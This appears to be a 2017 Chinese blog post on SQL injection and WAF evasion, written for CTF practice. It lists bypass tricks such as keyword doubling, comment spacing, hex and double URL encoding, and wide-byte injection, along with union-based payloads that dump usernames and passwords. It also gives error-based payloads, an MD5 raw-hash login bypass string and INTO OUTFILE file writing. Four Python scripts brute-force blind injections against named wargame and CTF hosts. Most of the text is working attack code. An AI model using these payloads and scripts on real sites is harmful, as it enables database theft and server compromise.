---
title: SQL注入&WAF绕过姿势
tags: [WEB漏洞]
date: 2017-03-02 22:30
---
# 1.WAF过滤机制： 1.异常检测协议–拒绝不符合HTTP标准的请求； 2.增强的输入验证–代理和服务端的验证而不只是限于客户端验证； 3.白名单&黑名单机制–白名单适用于稳定的Web应用，黑名单适合处理已知问题； 4.基于规则和基于异常的保护–基于规则更多的依赖黑名单机制基于，基于异常根据系统异常更为灵活；  5．另外还有会话保护、Cookies保护、抗入侵规避技术、响应监视和信息泄
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><hr>
<h1 id="1waf过滤机制">1.WAF过滤机制：</h1>
<p>1.异常检测协议–拒绝不符合HTTP标准的请求； <br>
2.增强的输入验证–代理和服务端的验证而不只是限于客户端验证； <br>
3.白名单&amp;黑名单机制–白名单适用于稳定的Web应用，黑名单适合处理已知问题； <br>
4.基于规则和基于异常的保护–基于规则更多的依赖黑名单机制基于，基于异常根据系统异常更为灵活；  <br>
5．另外还有会话保护、Cookies保护、抗入侵规避技术、响应监视和信息泄露保护等。</br></br></br></br></p>
<hr>
<h1 id="2waf绕过姿势">2.WAF绕过姿势</h1>
<h2 id="1大小写绕过">（1）大小写绕过</h2>
<p>此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。 <br>
<a href="http://wargame.kr:8080/login_filtering/" target="_blank">这里有道题</a></br></p>
<h2 id="2替换关键字">（2）替换关键字</h2>
<p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
<pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-label">http:</span>//www<span class="hljs-preprocessor">.xx</span><span class="hljs-preprocessor">.com</span>/index<span class="hljs-preprocessor">.php</span>?page_id=-<span class="hljs-number">15</span> UNIunionON SELselectECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span></code></pre>
<h2 id="3空格绕过">（3）空格绕过</h2>
<p><strong>payload</strong></p>
<pre class="prettyprint"><code class="language-sql hljs "><span class="hljs-operator"><span class="hljs-keyword">select</span>/**/*/**/<span class="hljs-keyword">from</span>/**/yz;</span>
<span class="hljs-operator"><span class="hljs-keyword">select</span>%<span class="hljs-number">0</span>a*%<span class="hljs-number">0</span>afrom%<span class="hljs-number">0</span>ayz;</span> %0a 是回车
<span class="hljs-comment">/*!select*/</span><span class="hljs-comment">/*!**/</span><span class="hljs-comment">/*!from*/</span><span class="hljs-comment">/*!yz*/</span>;

<span class="hljs-operator"><span class="hljs-keyword">select</span>(a)<span class="hljs-keyword">from</span>(yz);</span>
<span class="hljs-operator"><span class="hljs-keyword">select</span>(a)<span class="hljs-keyword">from</span>(yz)<span class="hljs-keyword">where</span>(a=<span class="hljs-number">1</span>);</span></code></pre>
<p>## （4）替换关键字 <br>
  这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</br></p>
<pre class="prettyprint"><code class="language-stylus hljs ">SELselectECT 1,2,3,4 </code></pre>
<h2 id="5url编码">（5）URL编码</h2>
<p>有时后台界面会再次URL解码所以这时可以利用二次编码解决问题 <br>
后台语句</br></p>
<pre class="prettyprint"><code class="language-php hljs "><span class="hljs-variable">$insert</span>=<span class="hljs-variable">$link</span>-&gt;query(urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]));
<span class="hljs-variable">$row</span>=<span class="hljs-variable">$insert</span>-&gt;fetch_row();</code></pre>
<pre class="prettyprint"><code class="language-sql hljs "><span class="hljs-operator"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> yz
<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>  %<span class="hljs-number">2579</span>%<span class="hljs-number">257</span>a</span></code></pre>
<h2 id="6十六进制绕过引号绕过">（6）十六进制绕过（引号绕过）</h2>
<p>在SQL语句的数据区域可以采用十六进制绕过敏感词汇</p>
<pre class="prettyprint"><code class="language-sql hljs "><span class="hljs-operator"><span class="hljs-keyword">select</span> a <span class="hljs-keyword">from</span> yz <span class="hljs-keyword">where</span> b=<span class="hljs-number">0x32</span>;</span>
<span class="hljs-operator"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> yz <span class="hljs-keyword">where</span> b=<span class="hljs-keyword">char</span>(<span class="hljs-number">0x32</span>);</span>
<span class="hljs-operator"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> yz <span class="hljs-keyword">where</span> b=<span class="hljs-keyword">char</span>(<span class="hljs-number">0x67</span>)+<span class="hljs-keyword">char</span>(<span class="hljs-number">0x75</span>)+<span class="hljs-keyword">char</span>(<span class="hljs-number">0x65</span>)+<span class="hljs-keyword">char</span>(<span class="hljs-number">0x73</span>)+<span class="hljs-keyword">char</span>(<span class="hljs-number">0x74</span>)



<span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">"users"</span>
<span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name=<span class="hljs-number">0x7573657273</span></span></code></pre>
<h2 id="7逗号绕过">（7）逗号绕过</h2>
<p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。 <br>
substr(),mid()</br></p>
<pre class="prettyprint"><code class="language-sql hljs ">mid(user() from 1 for 1)
substr(user() from 1 for 1)
<span class="hljs-operator"><span class="hljs-keyword">select</span> substr(<span class="hljs-keyword">user</span>()<span class="hljs-keyword">from</span> -<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> yz ;</span>
<span class="hljs-operator"><span class="hljs-keyword">select</span> ascii(substr(<span class="hljs-keyword">user</span>() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)) &lt; <span class="hljs-number">150</span>;</span>

同时也可以利用替换函数
<span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-keyword">left</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>)&gt;<span class="hljs-string">'tf'</span>;</span></code></pre>
<p>limit</p>
<pre class="prettyprint"><code class="language-sql hljs ">selete * from testtable limit 2,1;
selete * from testtable limit 2 offset 1;</code></pre>
<h2 id="8比较符绕过">（8）比较符(&lt;,&gt;)绕过</h2>
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest，strcmp来进行绕过了。</p>
<pre class="prettyprint"><code class="language-sql hljs "><span class="hljs-operator"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)=<span class="hljs-number">64</span>
<span class="hljs-keyword">select</span> strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>),<span class="hljs-number">0x32</span>);</span>#lpad('asd',2,0)
if(substr(id,1,1)in(0x41),1,3)</code></pre>
<p>新学习了一种骚骚的注入姿势in、between、order by <br>
<code>select * from yz where a in ('aaa');</code> <br>
<code>select substr(a,1,1) in ('a') from yz ;</code></br></br></p>
<p><code>select * from yz where a between 'a' and 'b';</code> <br>
<code>select * from yz where a between 0x89 and 0x90;</code></br></p>
<p><code>select * from yz union select 1,2,3 order by 1;</code> <br>
也可以用like，根据排列顺序进行真值判断</br></p>
<h2 id="9注释符绕过">（9）注释符绕过</h2>
<p>在注入时的注释符一般为<code># --</code>当两者不能用时就不能闭合引号 <br>
这里介绍一个奇淫巧技 <br>
<code>select 1,2,3 from yz where '1'/1=(1=1)/'1'='1'</code> <br>
(1=1)中就有了判断位为下面的注入打下基础</br></br></br></p>
<h2 id="10宽字节绕过">（10）宽字节绕过</h2>
<p>字节注入也是在最近的项目中发现的问题，大家都知道<code>%df’</code> 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 <code>%df\’</code>，其中\的十六进制是 <code>%5C</code> ，那么现在<code>%df\’</code> =<code>%df%5c%27</code>，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 <code>%df%5c</code> 是一个宽字符，也就是縗’，也就是说：<code>%df\’ = %df%5c%27=縗’</code>，有了单引号就好注入了。</p>
<blockquote>
<p>注：`select`防止用户自定义的名称和mysql保留字冲突</p>
</blockquote>
<h2 id="11with-rollup">（11）with rollup</h2>
<p>一般结合group by使用</p>
<pre class="prettyprint"><code class=" hljs asciidoc"><span class="hljs-header"> select 1 as test from  yz group by test with rollup limit 1 offset 1;
+------+</span>
<span class="hljs-header">| test |
+------+</span>
<span class="hljs-header">| NULL |
+------+</span></code></pre>
<h2 id="12无列名注入">（12）无列名注入</h2>
<p>给未知列名起别名 <br>
<code>select a from (select 1,2,3</code>a<code>union select * from yz)</code>v<code>;</code></br></p>
<h2 id="13-判断列数绕过">（13） 判断列数绕过</h2>
<p>当order by 被过滤后就可以使用into 变量来绕过 <br>
<code>select * from yz limit 1,1 into @a,@b,@c;</code></br></p>
<h1 id="3sql注入知识">3.SQL注入知识</h1>
<p>1.SQL越界 ，也就是能执行自己的sql语句 <br>
2.盲注的话找一个点可以控制两种不同的反应 <br>
3.取数据并做真值判断 <br>
4.写脚本暴库</br></br></br></p>
<p>上边是基于一般的注入题目的解题步骤，如果有特殊条件也可灵活变通</p>
<h2 id="mysql数据库元信息">mysql数据库元信息</h2>
<p>在mysql中存在information_schema是一个信息数据库，在这个数据库中保存了Mysql服务器所保存的所有的其他数据库的信息，如数据库名，数据库的表，表的字段名称 <br>
和访问权限。在informa_schema中常用的表有:</br></p>
<p>schemata:存储了mysql中所有的数据库信息，返回的内容与show databases的结果是一样的。 <br>
    tables:存储了数据库中的表的信息。详细地描述了某个表属于哪个schema，表类型，表引擎。 <br>
    show tables from secuiry的结果就是来自这个表 <br>
    columns:详细地描述了某张表的所有的列以及每个列的信息。 <br>
    show columns from users的结果就是来自这个表</br></br></br></br></p>
<pre class="prettyprint"><code class="language-sql hljs "><span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>();</span> #查选数据库
<span class="hljs-operator"><span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>  #查询数据库
<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;</span>  #查询表
<span class="hljs-operator"><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'users'</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;</span>  #查询列</code></pre>
<h2 id="1基本注入方式">（1）基本注入方式</h2>
<h3 id="得到字段总数">得到字段总数</h3>
<p>可以使用order by 函数，也可以直接使用union查询</p>
<pre class="prettyprint"><code class="language-sql hljs "><span class="hljs-operator"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> yz <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;</span>
ERROR 1054 (42S22): Champ '3' inconnu dans order clause</code></pre>
<p>当使用order by 3时程序出错，那么select的字段一共是2个。</p>
<h3 id="得到显示位">得到显示位</h3>
<p>在页面上会显示从select中选取的字段，我们接下来就是要判断显示的字段是哪几个字段。使用如下的payload(两者均可)进行判断。</p>
<pre class="prettyprint"><code class="language-sql hljs ">id=-1 union <span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> 
id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span></span></code></pre>
<p>如果是1显示出来，那么1就是显示位</p>
<h3 id="查看数据库">查看数据库</h3>
<pre class="prettyprint"><code class="language-sql hljs ">union <span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,version(),<span class="hljs-keyword">database</span>()</span></code></pre>
<h3 id="查选表名">查选表名</h3>
<p>由于database()返回的就是当前web程序所使用的数据库名，那么我们就利用database()来查询所有的表信息。当然在上一步中。我们也已经知道当前的database就是security。那么我们构造的payload如下：</p>
<pre class="prettyprint"><code class="language-sql hljs "> union <span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()</span></code></pre>
<h3 id="查选列名">查选列名</h3>
<p>在知道了表名之后，接下来我们利用information_schema.columns就可以根据表名来获取当前表中所有的字段。payload如下：</p>
<pre class="prettyprint"><code class="language-sql hljs ">id=-1 union <span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'users'</span>
id=-<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-number">0x7573657273</span>(users的十六进制)</span></code></pre>
<h3 id="查看数据库内容">查看数据库内容</h3>
<p>在知道了当前数据库所有的表名和字段名之后，接下来我们就可以dump数据库中所有的信息了。比如我们下载当前users表中所有的数据。可以使用如下的payload：</p>
<pre class="prettyprint"><code class="language-sql hljs ">id=-1 union <span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users</span></code></pre>
<h2 id="2报错注入">（2）报错注入</h2>
<ul>
<li>group by 与 floor rand 函数的报错</li>
</ul>
<p>payload</p>
<pre class="prettyprint"><code class="language-sql hljs ">(<span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-aggregate">count</span>(*) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)x <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">1</span>,floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)))</span></code></pre>
<p>测试语句</p>
<pre class="prettyprint"><code class="language-sql hljs "><span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> yz <span class="hljs-keyword">where</span> (<span class="hljs-keyword">select</span> <span class="hljs-aggregate">count</span>(*) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)x <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">222</span>,floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)));</span></code></pre>
<p>显示 <br>
Duplicata du champ ‘2221’ pour la clef ‘group_key’ <br>
在222处存在报错显示点，可利用此点进行报错注入</br></br></p>
<p>payload 利用方法 必须使其成为关键语句即where的决定权在payload中 <br>
例如：</br></p>
<pre class="prettyprint"><code class="language-sql hljs "> - where 1=1 and payload
 - where 1=2 or payload
 - where payload</code></pre>
<p><a href="http://www.cnblogs.com/xdans/p/5412468.html" target="_blank">这里有原理的解释</a> <br>
 - extractvalue <br>
payload</br></br></p>
<pre class="prettyprint"><code class="language-sql hljs ">extractvalue(1,concat(0x5c,(<span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)))
extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>),<span class="hljs-number">0x5c</span>,<span class="hljs-number">1</span>))</span></code></pre>
<p> <br>
 - updatexml <br>
payload</br></br></img></p>
<pre class="prettyprint"><code class="language-sql hljs ">updatexml(1,concat(0x5c,(<span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)),<span class="hljs-number">0</span>)
updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>),<span class="hljs-number">0x5c</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>)</span></code></pre>
<p>最近又出来了<code>insert update</code>的报错注入知识点如下 <br>
<code>or 注入语句 or</code> <br>
整体式子为 <br>
<code>INSERT INTO users (id, username, password) VALUES (2,'' or 注入语句 or'', '');</code></br></br></br></p>
<h2 id="3盲注">（3）盲注</h2>
<p>一般都是寻找盲注点，找到payload,利用payload <br>
在这里给出几个爆破脚本</br></p>
<pre class="prettyprint"><code class="language-python hljs "><span class="hljs-keyword">import</span> requests
url=<span class="hljs-string">r'http://web.jarvisoj.com:32787/login.php'</span>
string=<span class="hljs-string">''</span>
dic=<span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyz'</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:
        id=<span class="hljs-string">"/*'XOR(if(ord((select/**/substr(table_name,{0},1)/**/from/**/information_schema.tables/*!where*/table_schema=database()))={1},sleep(3),0))OR'*/"</span>.format(str(i),ord(j))
        data={
            <span class="hljs-string">'username'</span>:id,
            <span class="hljs-string">'password'</span>: <span class="hljs-number">1</span>
        }
        <span class="hljs-keyword">print</span> j
        s=requests.post(url=url,data=data)
        sec=s.elapsed.seconds
        <span class="hljs-keyword">if</span> sec &gt; <span class="hljs-number">2</span>:
            string+=j
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">print</span> string</code></pre>
<pre class="prettyprint"><code class="language-python hljs ">
<span class="hljs-keyword">import</span> requests
cookies={
        <span class="hljs-string">'PHPSESSID'</span>: <span class="hljs-string">'944d46747cd9059f63dc2e103b2fe31a'</span>
}

dic=<span class="hljs-string">'3_abcdefghijklmnopqrstuvwxyz'</span>
string = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:
        url=<span class="hljs-string">'http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 and ord((select substr(table_name,{0},1) from information_schema.tables where table_schema=database())) = {1}'</span>.format(str(i),ord(j))
        s=requests.get(url=url , cookies=cookies)
        content=s.content
        length=len(content)
        <span class="hljs-keyword">print</span> length
        <span class="hljs-keyword">if</span> length &gt; <span class="hljs-number">400</span> :
            string+=j
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">print</span> string </code></pre>
<p>二分法盲注</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment"># coding:utf-8</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> ceil
<span class="hljs-keyword">global</span> string
string = <span class="hljs-string">''</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">charge</span><span class="hljs-params">(mid,i)</span>:</span><span class="hljs-comment">#判断大小</span>
    url=<span class="hljs-string">'http://wargame.kr:8080/web_chatting/chatview.php?t=1&amp;ni=if(ascii(substr((select group_concat(readme) from chat_log_secret),{0},1))&lt;={1},10000000000,23334)'</span>.format(str(i),str(mid))
    <span class="hljs-comment">#</span>
    s=requests.get(url=url)
    content=s.content
    length=len(content)
    <span class="hljs-comment">#print length</span>
    <span class="hljs-keyword">if</span> length &gt; <span class="hljs-number">10</span> :
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dichotomie</span><span class="hljs-params">(l,r,i)</span>:</span><span class="hljs-comment">#利用二分法查找</span>

    mid = (l+r)/<span class="hljs-number">2</span>
    <span class="hljs-comment">#print "l and r ,mid:",l,r,mid</span>
    <span class="hljs-keyword">if</span> l == r:
        <span class="hljs-keyword">global</span> string
        string += chr(r)
        <span class="hljs-keyword">print</span> string
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span> charge(mid,i):<span class="hljs-comment">#&lt;=</span>
        <span class="hljs-comment">#print 0</span>
        dichotomie(l,mid,i)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment">#print 1</span>
        dichotomie(int(ceil((l+r)*<span class="hljs-number">1.0</span>/<span class="hljs-number">2</span>)),r,i)


<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):
    dichotomie(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>,i)
<span class="hljs-keyword">print</span> string


</code></pre>
<pre class="prettyprint"><code class=" hljs lua">import requests
cookies={
        <span class="hljs-string">'PHPSESSID'</span>: <span class="hljs-string">'i6vl5rbtr5r8gsiu5cl6bfi8g7'</span>
}


<span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):
        url=<span class="hljs-string">'http://202.120.7.197/app.php?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{},1)like({}),price,name)'</span>.format(str(i),hex(j))
        s=requests.get(url=url , cookies=cookies)
        content=s.content
        <span class="hljs-keyword">if</span> content.find(<span class="hljs-string">'5'</span>) == <span class="hljs-number">102</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'%'</span> != chr(j) :
            <span class="hljs-built_in">string</span>+=chr(j)
            <span class="hljs-keyword">break</span>
    <span class="hljs-built_in">print</span> <span class="hljs-built_in">string</span> </code></pre>
<h2 id="4md5注入">（4）MD5注入</h2>
<pre class="prettyprint"><code class="language-sql hljs ">$sql = "<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> admin <span class="hljs-keyword">WHERE</span> pass = <span class="hljs-string">'".md5($password,true)."'</span><span class="hljs-string">";</span></span></code></pre>
<p>md5($password,true)将MD5值转化为了十六进制 <br>
思路比较明确，当md5后的hex转换成字符串后，如果包含 ‘or’ 这样的字符串，那整个sql变成</br></p>
<pre class="prettyprint"><code class="language-sql hljs "><span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> admin <span class="hljs-keyword">WHERE</span> pass = <span class="hljs-string">''</span><span class="hljs-keyword">or</span><span class="hljs-string">'6&lt;trash&gt;'</span></span></code></pre>
<p>提供一个字符串：ffifdyop</p>
<h2 id="5order-by-name-注入">（5）order by name 注入</h2>
<p>order by name id <br>
id是一个注入点 <br>
可以利用if语句进行注入</br></br></p>
<p><code>order by name ,if(1=1,1,select 1 from information_schema.tables)</code> <br>
如果为假则执行第二条语句，要么报错要么没有返回值。这属于盲注的一种</br></p>
<h2 id="6运算符注入">（6）运算符注入</h2>
<p><code>select * from yz where a=''^'123'^'12'</code> <br>
<code>select * from yz where a=''^(substr('asd',1,1)&lt;'z')^1;</code></br></p>
<p>都可以作为盲注的条件语句</p>
<h2 id="7文件写入">（7）文件写入</h2>
<p>SQL语句 +   INTO OUTFILE ‘\var\www\html\1.txt’</p>
<h2 id="8-未知字段名注入">（8） 未知字段名注入</h2>
<p><code>select c from (select * from yz union select 1,2,3</code>c<code>)x;</code></p>
<h2 id="9空数据延时注入">（9）空数据延时注入</h2>
<p><code>select * from test where 1 and (select 1 from(select sleep(1))x);</code></p></hr></hr></div>
